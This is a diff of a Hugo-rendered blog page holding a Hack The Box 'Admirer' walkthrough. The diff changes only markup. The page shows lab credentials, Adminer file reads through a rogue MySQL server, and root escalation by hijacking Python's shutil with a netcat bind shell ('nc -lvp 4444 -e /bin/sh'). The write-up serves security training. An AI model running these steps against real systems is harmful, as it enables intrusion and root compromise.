@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.83.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.99.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="color-scheme" content="light dark">
 <meta name="supported-color-schemes" content="light dark"><title>HTB Admirer&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.8a20650921066633f421ce7a745e34cd4032f36a72cc46f51a06d1fe62549284c37e461fd23cd89b3f123ccdc212cd1b.css" integrity="sha384-iiBlCSEGZjP0Ic56dF40zUAy82pyzEb1GgbR/mJUkoTDfkYf0jzYmz8SPM3CEs0b"><meta name="twitter:card" content="summary" />
 <meta name="twitter:title" content="HTB Admirer" /><body><section id="header">
@@ -10,7 +10,7 @@
 <p>Admirer is a Linux box that features a vulnerable database setup and leveraging a maliciously crafted python library to achieve root.</p>
 <h2 id="enumeration">Enumeration</h2>
 <p>We start off, as always, with an NMAP Scan.</p>
-<pre><code>Nmap scan report for 10.10.10.187
+<pre tabindex="0"><code>Nmap scan report for 10.10.10.187
 Host is up (0.12s latency).
 Not shown: 997 closed ports
 PORT   STATE SERVICE VERSION
@@ -38,7 +38,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 <p>There also seemed to be a lot of rabbit holes. Or at least initially Ffuf found almost everything as a redirect.
 However, we eventually find two files.</p>
 <p><strong>/admin-dir/contacts.txt</strong></p>
-<pre><code>##########
+<pre tabindex="0"><code>##########
 # admins #
 ##########
 # Penny
@@ -65,7 +65,7 @@ Email: h.helberg@admirer.htb
 # Bernadette
 Email: b.rauch@admirer.htb
 </code></pre><p><strong>/admin-dir/credentials.txt</strong></p>
-<pre><code>[Internal mail account]
+<pre tabindex="0"><code>[Internal mail account]
 w.cooper@admirer.htb
 fgJr6q#S\W:$P
 
@@ -84,7 +84,7 @@ w0rdpr3ss01!
 <p><img  src="/img/Admirer_dbAdminPHP.png"
         alt="db_admin.php"/></p>
 <p>We don&rsquo;t have a database to use these at though currently. We determine it would probably be wise to check into <code>/utility-scripts</code> with ffuf and see if there is anything else of interest there. This part took tweaking to find the right wordlist. Eventually, dirb&rsquo;s big.txt pulled though.</p>
-<pre><code>.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
+<pre tabindex="0"><code>.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
 .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
@@ -95,13 +95,14 @@ phptest.php             [Status: 200, Size: 32, Words: 8, Lines: 1]
 <p><img  src="/img/Admirer_AdminerLogin.png"
         alt="AdminerLogin"/></p>
 <p>We return to the old stand by of googling and it pulls through once again. Adminer vulnerability brings up the following article in the first search result.</p>
-<p><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></p>
+<p><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool"target="_blank" rel="noopener noreferrer">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a>
+</p>
 <p>In summery, if you have database creds you can use them to access files local to the remote machine by connecting to a database of your own and loading the files into a table. Explanation of this might be a bit rough. Databases are not a strong point.</p>
 <p>I&rsquo;m using Kali which already had mysql installed so we don&rsquo;t need to do installation. Instead we just start the service and start interacting with it.</p>
-<pre><code>sudo systemctl start mysql
+<pre tabindex="0"><code>sudo systemctl start mysql
 sudo mysql
 </code></pre><p>We then need to create a databases and a table.</p>
-<pre><code>MariaDB [(none)]&gt; create database admirer;
+<pre tabindex="0"><code>MariaDB [(none)]&gt; create database admirer;
 Query OK, 0 rows affected (0.002 sec)
 
 MariaDB [(none)]&gt; use admirer;
@@ -113,18 +114,19 @@ Query OK, 0 rows affected (0.001 sec)
 <p><img  src="/img/Admirer_BindSQL.png"
         alt/></p>
 <p>We then need to set up a user and grant them remote access to the database. I used this article as a reference point.</p>
-<p><a href="https://webdock.io/en/docs/how-guides/how-enable-remote-access-your-mariadbmysql-database">https://webdock.io/en/docs/how-guides/how-enable-remote-access-your-mariadbmysql-database</a></p>
-<pre><code>MariaDB [(none)]&gt; create user 'admirer'@'localhost' identified by 'password';
+<p><a href="https://webdock.io/en/docs/how-guides/how-enable-remote-access-your-mariadbmysql-database"target="_blank" rel="noopener noreferrer">https://webdock.io/en/docs/how-guides/how-enable-remote-access-your-mariadbmysql-database</a>
+</p>
+<pre tabindex="0"><code>MariaDB [(none)]&gt; create user &#39;admirer&#39;@&#39;localhost&#39; identified by &#39;password&#39;;
 Query OK, 0 rows affected (0.002 sec)
 
-MariaDB [(none)]&gt; grant all on admirer.* to 'admirer'@'10.10.10.187' identified by 'password';
+MariaDB [(none)]&gt; grant all on admirer.* to &#39;admirer&#39;@&#39;10.10.10.187&#39; identified by &#39;password&#39;;
 Query OK, 0 rows affected (0.000 sec)
 
 MariaDB [(none)]&gt;
 </code></pre><p>With this we are able to login to our remote database from Admirer and load files into our table. After a bit we check out <code>index.php</code> and find more creds for Waldo.</p>
-<pre><code>load data local infile '../index.php'
+<pre tabindex="0"><code>load data local infile &#39;../index.php&#39;
 into table temp
-fields terminated by &quot;/n&quot;
+fields terminated by &#34;/n&#34;
 </code></pre><p><img  src="/img/Admirer_WaldoINdexPHP.png"
         alt/></p>
 <p>waldo:&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</p>
@@ -138,22 +140,22 @@ fields terminated by &quot;/n&quot;
         alt="Sudo Perms"/></p>
 <p>We can see that we can execute a python script <code>/opt/scripts/admin_tasks.sh</code> and we can control the environment for its execution. That&rsquo;s quite interesting. We take a look at the script and can see it is setup to preform a number of &ldquo;administrative&rdquo; functions.</p>
 <p>Option 6, backup_web looks juicy. It runs a python script called <code>backup.py</code> located in the same directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
-
-<span style="color:#f92672">from</span> shutil <span style="color:#f92672">import</span> make_archive
-
-src <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/www/html/&#39;</span>
-
-<span style="color:#75715e"># old ftp directory, not used anymore</span>
-<span style="color:#75715e">#dst = &#39;/srv/ftp/html&#39;</span>
-
-dst <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/backups/html&#39;</span>
-
-make_archive(dst, <span style="color:#e6db74">&#39;gztar&#39;</span>, src)
-</code></pre></div><p>We can see that it calls a python library. Because we can control the environment we can write and force the use of our own &ldquo;version&rdquo; of shutil. We head over to /tmp and create a <code>shutil.py</code> We then add the following code.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
-os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;nc -lvp 4444 -e /bin/sh&#34;</span>)
-</code></pre></div><p>We then run the program as root and specify the a python path as our current directory. That means that python will check here first before looking other places to find dependencies.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> shutil <span style="color:#f92672">import</span> make_archive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>src <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/www/html/&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># old ftp directory, not used anymore</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#dst = &#39;/srv/ftp/html&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dst <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/backups/html&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>make_archive(dst, <span style="color:#e6db74">&#39;gztar&#39;</span>, src)
+</span></span></code></pre></div><p>We can see that it calls a python library. Because we can control the environment we can write and force the use of our own &ldquo;version&rdquo; of shutil. We head over to /tmp and create a <code>shutil.py</code> We then add the following code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;nc -lvp 4444 -e /bin/sh&#34;</span>)
+</span></span></code></pre></div><p>We then run the program as root and specify the a python path as our current directory. That means that python will check here first before looking other places to find dependencies.</p>
 <p><code>sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh</code></p>
 <p>Select option 6, and a bind shell opens up we can connect to.</p>
 <p><code>nc 10.10.10.187 4444</code></p>
